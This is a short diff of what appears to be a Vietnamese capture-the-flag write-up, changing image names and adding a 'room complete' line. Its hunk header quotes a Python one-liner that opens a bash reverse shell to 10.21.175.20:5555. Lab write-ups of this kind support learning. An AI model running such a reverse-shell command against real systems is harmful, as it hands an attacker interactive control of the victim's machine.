@@ -336,6 +336,10 @@ import os;os.system(\"bash -c 'bash -i >& /dev/tcp/10.21.175.20/5555 0>&1'\")`
 
 - Thành công lấy được flag 🚩🚩🚩
 
-![Hoangdeptrai](Images/45.png) 
+![HoangVu](Images/45.png) 
 
-![Hoangdeptrai](Images/46.png) 
+![HoangVu](Images/49.png) 
+
+=> Hoàn thành room 🔥🔥🔥
+
+![HoangVu](Images/50.png) 
